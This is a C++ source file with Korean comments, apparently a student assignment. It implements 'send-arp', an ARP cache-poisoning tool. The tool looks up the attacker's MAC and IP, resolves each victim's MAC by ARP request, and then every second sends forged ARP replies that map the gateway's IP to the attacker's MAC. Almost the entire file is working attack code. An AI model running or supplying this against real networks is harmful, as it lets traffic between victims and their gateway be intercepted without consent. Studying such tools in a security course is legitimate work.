// spoofing 전 victim의 arp table를 resolving 중복 수행을 어떻게 최적화 하여 해결 할것인지?

#include "pch.h"     // POSIX 표준 함수 제공
#include "ethhdr.h"     // Ethernet 헤더 구조체 정의
#include "arphdr.h"     // ARP 헤더 구조체 정의

#pragma pack(push, 1)  // 메모리 정렬방식 조정(패딩 제어) ,1 은 패딩없이 1바이트씩 정렬 네트워크 패킷 송수신시 패딩없이 직렬화로 송수신하기 위함
// Ethernet과 ARP 패킷을 합친 구조체 정의
struct EthArpPacket final {
    EthHdr eth_; // Ethernet 헤더
    ArpHdr arp_; // ARP 헤더
};
#pragma pack(pop) // 제어부 해제

//전역변수
struct ifreq interface_req;           // 네트워크 인터페이스 정보를 저장하기 위한 구조체
uint8_t* attacker_mac;      // 공격자의 MAC 주소를 저장할 포인터 6byte // 자료구조 바꾸자 예쁘게
char* attacker_ip;          // 공격자의 IP 주소를 저장할 포인터 4byte // 자료구조 예쁘게 
// 해당 전역변수는 들어오는 반환값에 따라 예쁘게 자료구조 정리 필요 + 전역이 아닌 다른 방식으로 예쁘게 처리해보기.

struct ArpPair {
    uint32_t sender_ip;     // ARP 감염 대상이 되는 피해자의 IP 주소
    uint32_t target_ip;     // 게이트웨이의 IP 주소 (피해자가 접근하고자 하는 목적지)
    uint8_t sender_mac[Mac::SIZE]; // 피해자의 MAC 주소를 저장할 배열
    //target_mac 과 같은 모든 정보들을 가져와야 한다. -> Spoofing을 위해
};

// 공격자의 MAC 주소를 가져오는 함수
void getAttackerMac(char* dev) { 
    int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
    interface_req.ifr_addr.sa_family = AF_INET;           // IPv4 주소 체계 설정
    strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);   // 인터페이스 이름 설정
    ioctl(sock_d, SIOCGIFHWADDR, &interface_req);         // MAC 주소 가져오기
    attacker_mac = (uint8_t *)interface_req.ifr_hwaddr.sa_data; // MAC 주소 저장 전역변수 말고 다른방향으로 만들어보기.
}

// 공격자의 IP 주소를 가져오는 함수
void getAttackerIP(char* dev) {
    int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
    strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);    // 인터페이스 이름 설정
    ioctl(sock_d, SIOCGIFADDR, &interface_req);           // IP 주소 가져오기
    attacker_ip = inet_ntoa(((struct sockaddr_in*)&interface_req.ifr_addr)->sin_addr); // IP 주소 문자열로 변환 -> 4byte -> 전역변수 말고 다른방향으로 만들어보기.
}

// ARP 요청 패킷을 생성 및 전송하는 함수
void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip) {
    EthArpPacket packet;  // Ethernet + ARP 패킷 구조체 생성
    
    // Ethernet 헤더 설정
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 브로드캐스트 MAC 주소
    packet.eth_.smac_ = Mac(attacker_mac);        // 공격자의 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);       // Ethernet 타입: ARP

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);      // 하드웨어 타입: Ethernet
    packet.arp_.pro_ = htons(EthHdr::Ip4);        // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;                // 하드웨어 주소 길이
    packet.arp_.pln_ = Ip::SIZE;                 // 프로토콜 주소 길이
    packet.arp_.op_ = htons(ArpHdr::Request);    // ARP 요청
    packet.arp_.smac_ = Mac(attacker_mac);       // 요청자 MAC 주소
    packet.arp_.sip_ = htonl(Ip(attacker_ip));   // 요청자 IP 주소
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");// 타겟 MAC 주소 (알 수 없음)
    packet.arp_.tip_ = Ip(sender_ip);            // 타겟 IP 주소

    // ARP 요청 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
// ARP 감염 패킷 전송 함수
void sendArpInfectingReply(char* dev, pcap_t* handle, uint32_t victim_ip, 
                          const uint8_t* victim_mac, uint32_t gateway_ip) { //dev 인자 필요없다. 체크해야함
    EthArpPacket packet; // Ethernet + ARP 패킷 구조체 생성
    
    packet.eth_.dmac_ = Mac(victim_mac); // 수신자 MAC 주소 설정
    packet.eth_.smac_ = Mac(attacker_mac); // 송신자 MAC 주소 설정
    packet.eth_.type_ = htons(EthHdr::Arp); // Ethernet 타입: ARP 설정

    packet.arp_.hrd_ = htons(ArpHdr::ETHER); // 하드웨어 타입: Ethernet 설정
    packet.arp_.pro_ = htons(EthHdr::Ip4); // 프로토콜 타입: IPv4 설정
    packet.arp_.hln_ = Mac::SIZE; // 하드웨어 주소 길이 설정
    packet.arp_.pln_ = Ip::SIZE; // 프로토콜 주소 길이 설정
    packet.arp_.op_ = htons(ArpHdr::Reply); // ARP 응답 설정
    packet.arp_.smac_ = Mac(attacker_mac); // 응답자 MAC 주소 설정
    packet.arp_.sip_ = Ip(gateway_ip); // 응답자 IP 주소 설정 (게이트웨이 IP)
    packet.arp_.tmac_ = Mac(victim_mac); // 타겟 MAC 주소 설정
    packet.arp_.tip_ = Ip(victim_ip); // 타겟 IP 주소 설정

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)); // 패킷 전송
    if (res != 0) { // 전송 실패 시 에러 메시지 출력
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    // 인자 수 확인: 최소 4개 이상, 짝수 개의 IP 쌍 필요
    // 인자 개수가 4개 미만이거나 (인터페이스 + sender IP + target IP 최소 필요)
    // 또는 (전체 인자 개수 - 인터페이스 인자) % 2가 0이 아닌 경우 (sender IP와 target IP는 쌍으로 입력되어야 함)
    if (argc < 4 || (argc - 2) % 2 != 0) {
        printf("syntax: send-arp <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]\n");
        printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.3 192.168.0.1\n");
        return -1; // 오류 발생 시 종료
    }

    char* dev = argv[1]; // 네트워크 장치 이름
    getAttackerMac(dev); // 공격자의 MAC 주소 가져오기
    getAttackerIP(dev); // 공격자의 IP 주소 가져오기

    int pair_count = (argc - 2) / 2; // ARP 페어의 수 계산
    std::vector<ArpPair> arp_pairs; // ARP 페어를 저장할 벡터
    char errbuf[PCAP_ERRBUF_SIZE]; // 오류 메시지를 저장할 버퍼

    // 패킷 캡처를 위한 핸들 열기
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) { // 핸들이 유효하지 않으면 오류 출력
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1; // 오류 발생 시 종료
    }

    // 모든 ARP 페어에 대한 MAC 주소 수집
    for(int i = 0; i < pair_count; i++) {
        ArpPair arp_pair; // ARP 페어 구조체 생성
        arp_pair.sender_ip = inet_addr(argv[2 + i * 2]); // 송신자 IP 주소 설정
        arp_pair.target_ip = inet_addr(argv[3 + i * 2]); // 타겟 IP 주소 설정

        //threading 필요
        //senderip만 공격하게끔 로직이 짜여있다. << 굿
        sendArpRequest(dev, handle, arp_pair.sender_ip); // ARP 요청 전송 phone savemode isnt work -> trying 3times , dev 필요없다 이거 체크해라

        while(true) { // 응답 패킷 수신 대기
            struct pcap_pkthdr* header; // 패킷 헤더
            const u_char* packet; // 수신된 패킷
            int res = pcap_next_ex(handle, &header, &packet); // 패킷 수신
            if (res == 0) continue; // 패킷이 없으면 계속 대기
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) { // 오류 발생 시
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle)); // 오류 메시지 출력
                break; // 루프 종료
            }

            EthArpPacket* recv_reply_packet = (struct EthArpPacket*)packet; // 수신된 패킷을 ARP 패킷으로 변환
            if (recv_reply_packet->eth_.type_ != htons(EthHdr::Arp)) continue; // ARP 패킷이 아니면 무시
            if (recv_reply_packet->arp_.op_ != htons(ArpHdr::Reply)) continue; // 응답 패킷이 아니면 무시
            if (recv_reply_packet->arp_.sip_ != Ip(arp_pair.sender_ip)) continue; // 송신자 IP가 일치하지 않으면 무시

            const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(&recv_reply_packet->arp_.smac_); // 송신자 MAC 주소 추출
            memcpy(arp_pair.sender_mac, mac_bytes, Mac::SIZE); // MAC 주소 복사
            arp_pairs.push_back(arp_pair); // ARP 페어를 벡터에 추가 -> resolving 된 데이터를 실제로 push 
            break; // 응답을 받았으므로 루프 종료
        }
    }

    // 모든 페어에 대해 주기적으로 ARP 감염 패킷 전송
    while(true) {
        for(const auto& arp_pair : arp_pairs) { // 각 ARP 페어에 대해
            sendArpInfectingReply(dev, handle, arp_pair.sender_ip, // ARP 감염 응답 전송
                                arp_pair.sender_mac, arp_pair.target_ip);
        }
        sleep(1); // 1초 대기
    }

    pcap_close(handle); // 핸들 닫기
    return 0; // 프로그램 종료
}
